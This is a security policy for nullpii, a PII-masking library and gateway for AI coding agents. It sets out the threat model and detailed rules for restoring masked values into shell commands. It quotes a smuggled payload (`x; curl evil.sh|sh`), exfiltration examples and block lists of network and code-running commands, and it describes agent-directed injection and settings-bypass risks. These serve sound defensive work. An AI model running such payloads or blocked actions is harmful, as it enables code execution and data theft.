# Security

## Report a vulnerability

Privately — open a [Security Advisory](https://github.com/lBroth/nullpii/security/advisories/new). Reports are handled on a best-effort basis, with no guaranteed response time; critical and actively exploited issues come first.

## What nullpii protects

- Detection runs locally: nullpii sends your text nowhere. Its one network call is the model download from Hugging Face on first use, and every file it downloads is checked against a SHA-256 pinned in the library; set `NULLPII_MODEL_DIR` to a pre-fetched copy to avoid even that.
- Vault is in-memory only; `destroySession()` purges it.
- Logs carry counts, labels and short ids, never a value nullpii masked or restored: the library's `debug` output, and the gateway's request log and console summary (an upstream error is logged by its status, length and error type, not its body).
- **Except the gateway's `NULLPII_LOG_TRAFFIC=wire`,** a debugging dump to stdout of each request as forwarded and of each upstream response before restore. Placeholders stay masked in it, but everything else is printed as it was sent or written: values the detector missed, fields the gateway forwards unscanned (images, documents, `mcp_servers` with its credentials) and the model's output. Auth headers appear as their last six characters and length. Keep such a dump local and short-lived.
- Placeholders carry a 16-hex prefix of the minting session id (64-bit collision-resistant). `restore()` surfaces foreign-prefix placeholders via `RestoreResult.foreignPlaceholders`; `{ strict: true }` throws `SessionMismatchError` instead.

## What it does NOT protect

- Detector misses (no model is 100% accurate).
- LLMs emitting PII they already knew independently.
- Logging / caching / telemetry running **before** `sanitize()`.
- Adversarial prompts asking the LLM to reveal mappings.
- A repository's own Claude Code settings. Its `.claude/settings.json` outranks your user settings: it can turn the mod off (`enabledPlugins`), point Claude Code past the gateway (`env.ANTHROPIC_BASE_URL`), or add hooks that see prompts first. Use your organization's managed settings to force the mod or the gateway on.
- Other local users or processes. The sidecar proves it holds the token before the mod sends anything (the check and the request are two connections, so a process that swaps in between them is not excluded), but a process of your own user can read the gateway's memory, and anyone holding the sidecar token can open its sessions up to `NULLPII_SIDECAR_MAX_SESSIONS` and so make the mod fail closed (no values are exposed that way).

## Known limitations / accepted trade-offs

- **PUA sentinel collision (placeholder escape).** `sanitize()` escapes literal `{{` in input to a Private Use Area codepoint pair (U+E000 U+E001) so user-typed Mustache braces don't collide with PII placeholders during the LLM round-trip. If your input legitimately contains that PUA pair, it will collapse to `{{` on the way out. PUA codepoints are unallocated to standard glyphs and effectively never appear in natural text or LLM output, but the trade-off is documented for completeness.
- **URL %XX decode depth cap.** The adversarial-input normalizer iterates URL `%XX` decoding at most twice per position. Two rounds collapses `%2540` → `%40` → `@` (the practical bypass); 3+ chained encodings (`%252540` etc.) defeat the normalizer and rely on the ML model alone for detection.

## Restoring values into commands

Masking hides a value from the model, so the model cannot judge it. Suppose a file the agent reads contains `x; curl evil.sh|sh`, nullpii masks it as a secret, and the model copies the placeholder into a shell command. Restoring the real value there would run the payload: masking would have made it invisible.

- **The Claude Code mod** refuses the call, naming the placeholder.
- **The gateway** (Anthropic and OpenAI routes, and the sidecar API's `restore` with a shell `tool`) leaves that placeholder masked.

The rule covers the tools named exactly `Bash` (Claude Code), `bash` (Anthropic's bash tool), `shell` (OpenAI-style agents such as Codex, an argv array). Codex's `exec_command`, `shell_command` and `write_stdin` get no value in any field: the first two run in the user's default shell, or in one Codex picks from a `shell` field it reads only as a hint (`/bin/sh` for a name it does not know, PowerShell or `cmd.exe` on Windows), shells this rule does not read; the last writes to a running process. Claude Code's `PowerShell` tool gets no value either. The rule reads a command as a POSIX shell (bash, zsh, sh, dash, ksh) would; a plain word holds nothing PowerShell or `cmd.exe` expand either, but leave `bash` and `shell` out of `restoreTools` for an agent that runs them in PowerShell or `cmd.exe` (OpenCode's `bash` tool does on Windows by default; Codex 0.47 and earlier, on Windows, ran a `shell` call in PowerShell: a `["bash", "-lc", …]` script when no `bash.exe` was found, and any other array joined into one PowerShell command). A shell tool under any other name gets every value back like any other tool in `restoreTools`, so do not add one there. In the input of `Bash`, `bash` and `shell`, `command` follows the rule below, the descriptive `description` and `justification` fields get their values as usual, and every other field (`workdir`, `cwd`, `env`, `timeout`, or one nullpii does not know) keeps its placeholders: it can choose where or how the command runs, as a `cd` argument or an assignment would. A non-empty `workdir`, `cwd` or `working_directory` counts as a `cd` for the command's writes, so a relative file written there gets no value; Codex sends `workdir` on most calls, and when that path holds a masked value (a user name) the call names a directory that does not exist and fails rather than run elsewhere. An input that is not an object keeps every placeholder.

**A value comes back only into a command written in a small grammar that nullpii reads whole.** In shell code: words, single-quoted strings, double-quoted strings without `$`, a backtick or a backslash, the operators `&&`, `||`, `|` and `;`, line breaks, redirections (`>`, `>>`, `>|`, `2>`, `2>&1`, `>&FILE`, `<>`, `<`) and heredocs (`<<'EOF'`, `<<"EOF"`, `<<\EOF`, `<<EOF`, and the same with `<<-`, each with a delimiter that is a name of letters, digits and `_`, its body and its closing line). Anything else in shell code keeps every placeholder in the whole command: `$` in any form (variables, `$(…)`, `${…}`, `$((…))`, `$'…'`), backticks, backslashes, parentheses and braces (subshells, groups, process substitution, brace expansion), `#` comments, a lone `&` (background, `|&`, `<&`, and `&>`, which dash and ksh read as a background `&` then `>`), `>!` (a zsh redirection, a file named `!…` elsewhere), `>>&` (zsh appends to a file named by what follows it, other shells reject it), `;;`, `[[`, here-strings (`<<<`), control characters other than tab and line feed (Unicode category Cc: U+0000–U+001F and U+007F–U+009F) and the line and paragraph separators U+2028 and U+2029 (shells drop a NUL and keep a carriage return in a word), a heredoc operator with no body after it, and a reserved word (`if`, `for`, `while`, `case`, `function`, `!`, …) where the program of a simple command would stand, at its start or after assignments and redirections (`LANG=C for …` runs a program named `for` in bash and fails in zsh); so does a bare-delimiter heredoc body (`<<EOF`) that holds `$`, a backtick or a backslash. Shells disagree on how such constructs nest and end (bash 3.2, macOS's `/bin/bash`, scans the text of `$(…)` for quotes, parentheses and comments to find its end; bash 5.2 ends a heredoc body inside `$(…)` at a line that starts with the delimiter and holds a `)`), so nullpii does not read them at all. A command of redirections alone runs a program in zsh (`cat` for `> notes.md` or a heredoc with no program, the pager `more` for a lone `< notes.md`); nullpii reads no program there, and judges its targets and any body as everywhere else (documents only, plain words only).

**Within that grammar, a value comes back only into a command whose every program is on a short list of programs that read their arguments as data:** `ls`, `cat`, `head`, `tail`, `wc`, `grep`, `egrep`, `fgrep`, `rg`, `find`, `stat`, `file`, `du`, `df`, `diff`, `cmp`, `sort`, `cut`, `tr`, `jq`, `echo`, `mkdir`, `cd`, `pwd`, `touch`, `basename`, `dirname`, `realpath`, `readlink`, `sha256sum`, `sha1sum`, `md5sum`, `shasum`, `base64`, `column`, `nl`, `true`, `false`, `:`, and `git` `log`, `status`, `diff`, `show`, `add`, `commit`, `blame`, `grep`, `ls-files`, `rev-parse`; each by name exactly as written (no other letter case, version suffix or `.exe`), with no wrapper (`sudo`, `env`, …) and no variable assignment, before it, as a command of its own (`PATH=…; grep …`), other than `LANG`, `LANGUAGE`, `LC_*` or `TZ` with a plain value: for `LANG` and `LC_*`, `C`, `POSIX`, a UTF-8 locale of the form `ll[_TT].UTF-8[@mod]` (`C.UTF-8`, `en_US.UTF-8`, `de_DE.UTF-8@euro`) or empty, since a shell told to use another multibyte encoding (GBK, Big5, Shift JIS) would read the command's bytes differently; for `LANGUAGE`, which picks message catalogs only, names of letters, digits and `_.@-` separated by `:`, each starting with a letter, digit or `_` (`en_US:en`); for `TZ`, a zone name of parts of letters, digits and `_+-` separated by `/`, each starting with a letter, digit or `_` (`UTC`, `Europe/Rome`, `Etc/GMT+1`); so no path (`/…`, `./…`, `..`, `:…`), no space and no `=`, which could choose what is loaded or evaluated (`PATH`, `HOME`, `GIT_EDITOR` and the like choose what a listed program runs or reads; an assignment or a redirection counts as one only when its name and `=`, or its operator, are written unquoted: `'LC_ALL=C' grep …` runs a program named `LC_ALL=C`, which is off the list), not by path, with no redirection before it (`>| cat …`), and for `git` with the subcommand right after `git` (no global options such as `-C` or `--no-pager`). nullpii assumes the shell itself runs in a UTF-8 or single-byte locale (in a GBK, Big5 or Shift JIS one, a byte after a non-ASCII character can be read as part of it) and has the builtins it starts with: a module or loadable builtin that replaces a listed program (zsh's `zsh/stat`, bash's loadable `stat`, `realpath`, `cut`) is covered only for the options that name a variable to set in those (`stat -A`/`-H`, `realpath -a`, `cut -a`). `printf`, `test` and `[` are not on the list: zsh and ksh93 may read their arguments as arithmetic, which can set variables for every later command, in more forms than a rule can list; `echo` prints a value. Any other program keeps every placeholder in the whole command: no list can name every program that sends data out, runs code it is handed or writes where an argument says, so the default is to restore nothing. Programs that overwrite or delete where an argument points (`cp`, `mv`, `rm`, `tee`, `install`) are not on the list, and neither are options of listed programs that run or write (`find -exec`/`-delete`/`-fprint`, `rg --pre`/`--hostname-bin`, `sort -o`, `base64 -o`, `file -C`, `git --output`, `git grep -O`, every abbreviation that getopt_long or git accepts, down to one letter, such as `sort --o` (ripgrep accepts none), and a short option anywhere in a cluster of any length, digits included, such as `git grep -n3O…`; the letter counts anywhere in such a word, so an attached argument that holds it, such as `git log -SOliver`, keeps every placeholder too): a command that uses one keeps every placeholder. A `cd` argument never gets a value: it chooses the directory every later command runs in, also in the next call when the shell is kept across calls, and git reads its configuration and hooks there.

On top of that list, as a second line, these keep every placeholder even with listed programs:

- **sending data out:** a network client, an upload, a fetch or an install, `/dev/tcp`, a Windows network path (`//host/…`, or Cygwin's `/proc/sys/…`, which Git Bash and Cygwin programs open over the network; read on every word, redirection target and working-directory field as the program gets it, quotes removed, so `'/'/host/…` and `-f//host/…` count too), a URL handed to any program but `cat`, `echo`, `mkdir`, `cd`, `touch`, `ls`, `pwd`, `true`, `:` or `git commit`/`add`/`status`/`diff`/`log`/`show`, anywhere in the text;
- **running code:** an interpreter or program that evaluates code (`bash -c`, `python3`, `eval`, `xargs`, …), an option that runs a command (`find -exec`, `rg --pre`, `sort --compress-program`, `git -c`, …), a command that sets what later commands run (`git config`, `crontab`, …), or that writes into a file that runs later (`.git/hooks/`, `.husky/`, a shell start-up file, `.envrc`, `/etc/`, a `bin/` directory; read on the target as written, in any letter case); the code flag of a shell or a common interpreter (`bash -c`, `tcsh -c`, `python3 -c`, `node -e`, `perl -e`, `php -r`, `pwsh -…`; `NESTED_INTERPRETER` in `packages/gateway/src/shell-restore.ts` lists them), spelt as it lists them (lower case; `Rscript` as is), counts anywhere in the text, even inside a search pattern (`grep 'bash -c' notes.md`), and so do a pipe into one of them (`| sh`) and the bare names `eval` and `awk`; a bare interpreter name (`grep python3 notes.md`) does not, and other interpreters count only as the program a command runs;
- **`sed`, `perl`, `ruby`:** their code can be ended by any character and run what follows; naming one in lower case anywhere in the text is enough, even as a search pattern (`grep perl notes.md`).

These checks skip the body of a heredoc written out as data, so a commit message that mentions `ssh` is not a network call; a bare `<<EOF` body that holds `$`, a backtick or a backslash would expand, so it is outside the grammar and the whole command keeps every placeholder (above). They run twice: on the command as the model wrote it, and on the command with the values put back. The second run must also find the command split into the same simple commands and heredoc bodies as the first; a value that changes that, such as one that reads as the heredoc delimiter on its line and so ends the body early, keeps every placeholder.

Otherwise **a value comes back only as one plain word:** letters, digits and `@+:,./_=-`, not starting with `-` (an option), `=` (zsh's `=cmd`), `~` (a home directory), `@` (PowerShell reads `@name` as a variable) or `//` (a network path under Git Bash or Cygwin); `%` is left out, which `cmd.exe` expands. Such a word cannot end the quoting it stands in or start another command. And **never where it would choose what runs, what is written, or what later commands see:** a placeholder that is, or is part of, the program a simple command runs (after an assignment or an operator, or named by a path such as `./{{…}}`), a redirection target (`> {{…}}`, also glued to the word before it: `a<{{…}}`), an assignment (`PAGER={{…}}`), a `cd` argument, an argument of `export`, `alias`, `declare` and the like, or a placeholder written in shell code (not inside quotes) directly before `<` or `>`, or before digits and then `<` or `>` (`{{…}}2>err.log`; a value of digits would become, or join, a file descriptor number) stays masked.

| Position | What the value may contain |
|---|---|
| Any position in a command that runs a program off the list, sends data out or runs code (above), writes through an output redirection in any form (`>`, `>>`, `>|`, `>&FILE`, `<>`) to a file that is not a document, or to any relative file in a command that also runs `cd` or whose tool input sets `workdir`, `cwd` or `working_directory` (the file lands where that points) (`/dev/null`, `/dev/stdout` and `/dev/stderr` are no file, and a `>` inside quotes is no redirection), has a simple command of 64 words or more (a redirection counting as one word when its target is glued to the operator, `>notes.md`, and as two when it is not, `> notes.md`) or of more than 4,096 characters (heredoc bodies not counted), has a heredoc body whose closing line cannot be found, or leaves the grammar read (above) | Nothing: every placeholder stays masked |
| The program of a simple command, or part of it; a redirection target; an assignment; a `cd` argument; an argument of `export`, `alias`, …; a placeholder in shell code directly before `<` or `>`, or before digits and then `<` or `>` | Nothing: it stays masked |
| Anywhere else in shell code, quoted or not | One plain word |
| Heredoc body that `cat` writes out, or that `git commit -F -` (`-F-`, `--file=-`, `--file -`) reads as its message, in a command that runs only `cat`, `echo`, `mkdir`, `cd`, `touch`, `ls`, `pwd`, `true`, `:` or `git` `commit`, `add`, `status`, `diff`, `log`, `show`, each by name, with its quoting closed, and not piped on (no `|` or `||` after the operator on its line), and written to standard output or to a document file (`.md`, `.markdown`, `.csv`, `.tsv`, `.log`, `.rst`; not `.txt`, which pip, CMake and pytest read as input by name) with no hidden directory or file on its path, case ignored | Literal body (`<<'EOF'`, `<<"EOF"`, `<<\EOF`): no line break and no other control character but tab. Bare delimiter (`<<EOF`): the same, and no `$`, backtick or backslash. In both, nothing that ends the body early (above) |
| A heredoc body written to any other file (`.git/config`, `Makefile`, `run.sh`, `CMakeLists.txt`, `requirements.txt`, …), expanding or not | Nothing: every placeholder in the command stays masked |
| Any other heredoc body | One plain word, or nothing in a command above |

So an email or a single-word name comes back in a command such as `grep`, `ls` or `git log`; a name like `Mary Ann` or `D'Amico` comes back only in a heredoc body written out as data, such as `cat > notes.md <<'EOF'` or a commit message given as `git commit -F - <<'EOF'`; Claude Code's usual commit form, `git commit -m "$(cat <<'EOF' … EOF)"`, keeps every placeholder, since `$(…)` is outside the grammar read (the Claude Code mod's refusal tells Claude to use `-F -` instead); and any command with a program off the list (`npm test`, `python3 x.py`, `make`, `curl`, `cp`) gets no values at all, even after a `cd`.

A `command` sent as an argv array (`["bash", "-lc", "…"]`, as Codex does) follows the same rules: never the program, never an argument of `cd`, `export` and the like, nothing in a program off the list, no word read as an assignment or a redirection (no shell reads the array), and the script a POSIX shell (`bash`, `sh`, `zsh`, `dash`, `ksh`, `mksh`) runs with `-c` (past options such as `-o pipefail`) is judged as a string command, its data heredoc bodies skipped as there, when that shell is the first word, named as written or as `/bin/…` or `/usr/bin/…`; any other shell (`fish`, `csh`, …), or one behind a wrapper, another path, letter case or version suffix, gets no value.

The command is read once, in time linear in its length; one longer than 262,144 characters (UTF-16 code units) keeps every placeholder; so does one with a simple command of 64 words or more or of more than 4,096 characters, whose later words the rule does not read (a heredoc body is no part of its command's words, so a long commit message does not count), and one with a heredoc body whose closing line the reader cannot find, since every command after it is then unknown. The list of programs that get values back is closed: a program it does not name gets nothing. The lists of network clients and code runners are a second line within it.

**A limit by design: each call is judged on its own.** A relative write target is judged as written: a working directory that an earlier command left (Claude Code keeps it from call to call, inside the project) is not seen, so a document written by a later call lands there. The document types (`.md`, `.csv`, …) are ones no shell, build tool or test runner reads as code or configuration by name with two exceptions: agents read `CLAUDE.md` or `AGENTS.md` as instructions, and documentation-site builders (Docusaurus by default, VitePress) compile `.md` pages as MDX or Vue, so a value written into such a page runs when the site is built, as after `Write`; and the checks on a written path (no hidden directory, no `bin/` directory) read it as written only. `Write`, `Edit` and the other file tools get real values back whenever they are in `restoreTools`, as they are by default, since writing your data to your files is what they are for. A value restored by one call can therefore leave through a later call that holds no placeholder: a file written by `Write` or a shell redirect and then sent (`curl -d @notes.md …`), a commit followed by `git push`, a variable set in a shell that Anthropic's bash tool keeps across calls. A later command can also run such a file (`bash run.sh` after `Write run.sh`). The rule does not follow what a file, a commit or a shell holds.

**Permission rules see the masked call (Claude Code mod).** Claude Code decides on a tool call, by your rules or by asking you, before the mod puts the real values back. A rule written with a value nullpii masks, such as a path with your user name (`Read(/Users/<name>/.ssh/**)`), may not match the masked path; write such rules without the part that is masked (`Read(**/.ssh/**)`). After the restore the mod checks again only that the call does not touch its own policy file.

If you call `restore()` yourself and pass the result to a shell, an interpreter, a query or a template, apply the same care. A restored value is data you did not show the model, and it can come from content an attacker controls.

## Detection is not a guarantee

nullpii lowers the amount of personal data and secrets that leave the machine. It does not bring it to zero. It is **pseudonymization with a measurable leak rate**, not anonymization. The residual risk depends on the data:
- the README's Benchmark section and `packages/eval/METHOD.md` report it on public datasets;
- measure it on content like yours before you rely on it.

Treat a sanitized prompt as lower-risk, not as free of personal data.

## CI-enforced rules

- Runtime dependencies under Apache-2.0, MIT, BSD, ISC or CC0 only (`npm run license-check`); development dependencies may also be BlueOak-1.0.0, Unlicense or 0BSD (the dependency review in `security.yml`).
- npm releases use `--provenance`.
- File paths sandboxed to a cache root (`InvalidPathError` on traversal).

## Supply chain and leak gates

`.github/workflows/security.yml` runs on every PR and every push to `main`:

| Gate | What it blocks |
|---|---|
| gitleaks (`.gitleaks.toml`) | Secrets in the commits a change adds, and in the tree. Fake fixtures are allowed by exact value only. |
| Repo hygiene (`scripts/check-repo-hygiene.mjs`) | Private research notes, benchmark outputs, model weights, key material, `.env` files, files over 5 MB, absolute home paths, private package registries |
| CodeQL (`security-extended`) | Static-analysis findings in the TypeScript and the Python eval kit |
| Dependency review | New dependencies with a high-severity advisory or a licence outside the allowlist |

The same secret and hygiene checks run locally through `lefthook`. Every workflow pins its actions and container images by digest, and Dependabot keeps the pins current. CI tokens default to read-only.

Test fixtures follow the reserved-value policy in [CONTRIBUTING.md](https://github.com/lBroth/nullpii/blob/main/CONTRIBUTING.md#test-data).
